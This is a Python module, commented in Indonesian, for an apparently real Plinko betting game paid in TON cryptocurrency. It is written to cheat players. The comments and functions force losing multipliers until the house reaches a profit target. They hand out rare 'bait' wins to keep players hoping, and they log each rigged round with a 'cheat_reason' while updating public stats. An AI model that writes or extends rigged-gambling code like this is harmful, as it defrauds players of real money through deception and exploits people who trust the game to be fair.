# games/database/plinko_bandar_v2.py - SISTEM BANDAR NEVER LOSE
# BANDAR HARUS UNTUNG, TARGET MINIMAL 5 TON

import sqlite3
import random
import os
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DB_PATH = os.path.join(BASE_DIR, 'games', 'database', 'plinko.db')

# PASTIKAN PATH DATABASE BENAR
print(f"📁 plinko_bandar_v2 DB Path: {DB_PATH}")
print(f"📁 Database exists: {os.path.exists(DB_PATH)}")

TARGET_PROFIT = 5.0  # Target minimal keuntungan bandar

# MULTIPLIER PALING KECIL UNTUK SETIAP RISK (PASTI RUGI)
LOSS_MULTIPLIERS = {
    'low': [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7],
    'medium': [0.0, 0.1, 0.1, 0.2, 0.2, 0.3, 0.4, 0.5],
    'high': [0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 0.2]
}

# KADANG KASIH MULTIPLIER SEDIKIT LEBIH BESAR (TAPI TETAP RUGI)
SMALL_WIN_MULTIPLIERS = {
    'low': [0.8, 0.9],
    'medium': [0.6, 0.7, 0.8],
    'high': [0.4, 0.5]
}

# MULTIPLIER UNTUK MENARIK PEMAIN (JARANG, BIARIN PEMAIN BERHARAP)
BAIT_MULTIPLIERS = {
    'low': [1.2, 1.5, 2.0],
    'medium': [1.2, 1.5, 2.0, 2.5],
    'high': [1.2, 1.5, 2.0]
}

def get_bandar_profit():
    """Dapatkan keuntungan bandar saat ini"""
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT total_bet_all_time, total_win_all_time, bandar_profit 
            FROM bandar_profit ORDER BY id DESC LIMIT 1
        ''')
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return {
                'total_bet': row['total_bet_all_time'] or 0,
                'total_win': row['total_win_all_time'] or 0,
                'profit': row['bandar_profit'] or 0
            }
    except Exception as e:
        print(f"❌ Error get_bandar_profit: {e}")
    
    return {'total_bet': 0, 'total_win': 0, 'profit': 0}

def update_bandar_profit(bet_amount, win_amount):
    """Update keuntungan bandar"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        profit_change = bet_amount - win_amount
        
        cursor.execute('''
            UPDATE bandar_profit 
            SET total_bet_all_time = total_bet_all_time + ?,
                total_win_all_time = total_win_all_time + ?,
                bandar_profit = bandar_profit + ?,
                last_updated = CURRENT_TIMESTAMP
        ''', (bet_amount, win_amount, profit_change))
        
        conn.commit()
        conn.close()
        return profit_change
    except Exception as e:
        print(f"❌ Error update_bandar_profit: {e}")
        return 0

def get_bandar_status():
    """Cek status bandar"""
    profit_data = get_bandar_profit()
    current_profit = profit_data['profit']
    
    deficit = TARGET_PROFIT - current_profit
    needs_force = current_profit < TARGET_PROFIT
    
    return {
        'current_profit': current_profit,
        'target': TARGET_PROFIT,
        'deficit': deficit,
        'needs_force': needs_force
    }

def get_forced_multiplier(risk_level, user_id=None, user_loss_data=None):
    """Dapatkan multiplier yang memaksa pemain RUGI BESAR"""
    status = get_bandar_status()
    
    # HITUNG INTENSITAS KECURANGAN
    if status['current_profit'] < 0:
        intensity = 1.0
    elif status['current_profit'] < TARGET_PROFIT:
        intensity = 0.95
    else:
        intensity = 0.7
    
    roll = random.random()
    
    if roll < intensity:
        multipliers = LOSS_MULTIPLIERS.get(risk_level, LOSS_MULTIPLIERS['medium'])
        chosen = random.choice(multipliers)
        reason = f'force_loss_intensity_{intensity}'
        
        if status['current_profit'] < -10:
            chosen = min(multipliers)
            reason = 'extreme_force_loss'
            
    elif roll < intensity + 0.15:
        multipliers = SMALL_WIN_MULTIPLIERS.get(risk_level, SMALL_WIN_MULTIPLIERS['medium'])
        chosen = random.choice(multipliers)
        reason = 'small_win_still_loss'
    else:
        multipliers = BAIT_MULTIPLIERS.get(risk_level, BAIT_MULTIPLIERS['medium'])
        chosen = random.choice(multipliers)
        reason = 'bait_multiplier'
    
    print(f"🔴 [FORCED] Risk: {risk_level} | Multiplier: {chosen}x | Reason: {reason}")
    print(f"   Bandar profit: {status['current_profit']:.2f} TON | Need: {TARGET_PROFIT} TON")
    
    return chosen, True, reason

def get_multiplier_bandar(risk_level, bet_amount, user_id, username):
    """Fungsi utama untuk mendapatkan multiplier - PASTI BANDAR UNTUNG"""
    
    status = get_bandar_status()
    current_profit = status['current_profit']
    
    print(f"📊 [BANDAR] Current profit: {current_profit:.2f} TON | Target: {TARGET_PROFIT} TON")
    
    deficit = TARGET_PROFIT - current_profit
    
    if deficit > 0:
        # BANDAR BELUM UNTUNG - PAKSA RUGI
        chosen = random.choice(LOSS_MULTIPLIERS.get(risk_level, [0.1, 0.2]))
        reason = 'force_loss_profit_target'
        
        if deficit > 10:
            chosen = min(LOSS_MULTIPLIERS.get(risk_level, [0.0, 0.1]))
            reason = 'extreme_force_large_deficit'
            
    else:
        # BANDAR SUDAH UNTUNG
        chosen = random.choice(LOSS_MULTIPLIERS.get(risk_level, [0.1, 0.2, 0.3]))
        reason = 'force_loss_maintain_profit'
        
        if current_profit > 20:
            if random.random() < 0.2:
                chosen = random.choice(SMALL_WIN_MULTIPLIERS.get(risk_level, [0.8]))
                reason = 'mercy_but_still_profitable'
    
    print(f"🔴 [BANDAR RESULT] {username} | Bet: {bet_amount} | Multiplier: {chosen}x | Win: {bet_amount * chosen} | Reason: {reason}")
    
    return chosen, True, reason

def save_forced_game_result(data):
    """Simpan hasil game dengan tracking bandar"""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # Cek apakah tabel plinko_games punya kolom yang diperlukan
        cursor.execute("PRAGMA table_info(plinko_games)")
        columns = [col[1] for col in cursor.fetchall()]
        
        has_is_forced = 'is_forced' in columns
        has_cheat_reason = 'cheat_reason' in columns
        has_photo_url = 'photo_url' in columns
        
        # Build query dinamis
        fields = ['round_hash', 'user_id', 'username', 'bet_amount', 'multiplier', 'win_amount', 'risk_level', 'created_at']
        placeholders = ['?', '?', '?', '?', '?', '?', '?', '?']
        values = [
            data['round_hash'],
            data.get('user_id'),
            data.get('username'),
            data['bet_amount'],
            data['multiplier'],
            data['win_amount'],
            data['risk_level'],
            datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ]
        
        if has_photo_url:
            fields.append('photo_url')
            placeholders.append('?')
            values.append(data.get('photo_url'))
        
        if has_is_forced:
            fields.append('is_forced')
            placeholders.append('?')
            values.append(1)
        
        if has_cheat_reason:
            fields.append('cheat_reason')
            placeholders.append('?')
            values.append(data.get('cheat_reason', 'bandar_never_lose'))
        
        query = f"INSERT INTO plinko_games ({', '.join(fields)}) VALUES ({', '.join(placeholders)})"
        cursor.execute(query, values)
        
        print(f"✅ Game saved with multiplier: {data['multiplier']}x")
        
        # Update bandar profit
        update_bandar_profit(data['bet_amount'], data['win_amount'])
        
        # Update stats
        cursor.execute('SELECT COUNT(DISTINCT user_id) FROM plinko_games')
        total_players = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT COUNT(*) FROM plinko_games')
        total_games = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT MAX(multiplier) FROM plinko_games')
        biggest_multiplier = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT MAX(win_amount) FROM plinko_games')
        biggest_win = cursor.fetchone()[0] or 0
        
        cursor.execute('SELECT SUM(bet_amount), SUM(win_amount) FROM plinko_games')
        total_bet, total_win = cursor.fetchone()
        
        cursor.execute('''
            SELECT username, created_at FROM plinko_games 
            ORDER BY created_at DESC LIMIT 1
        ''')
        last = cursor.fetchone()
        
        # Cek apakah plinko_stats ada
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='plinko_stats'")
        if cursor.fetchone():
            cursor.execute('''
                UPDATE plinko_stats SET
                    total_players = ?,
                    total_games = ?,
                    biggest_multiplier = ?,
                    biggest_win = ?,
                    total_bet_amount = ?,
                    total_win_amount = ?,
                    last_player = ?,
                    last_time = ?,
                    current_hash = ?,
                    updated_at = CURRENT_TIMESTAMP
            ''', (
                total_players, total_games, biggest_multiplier, biggest_win,
                total_bet or 0, total_win or 0,
                data.get('username') or (last[0] if last else None),
                last[1] if last else None,
                data['round_hash']
            ))
        
        conn.commit()
        conn.close()
        
        profit_data = get_bandar_profit()
        print(f"💰 [BANDAR AFTER] Profit: {profit_data['profit']:.2f} TON | Target: {TARGET_PROFIT} TON")
        
        return True
        
    except Exception as e:
        print(f"❌ Error saving: {e}")
        import traceback
        traceback.print_exc()
        return False

# Test koneksi database saat import
print(f"✅ plinko_bandar_v2.py loaded with TARGET_PROFIT={TARGET_PROFIT}")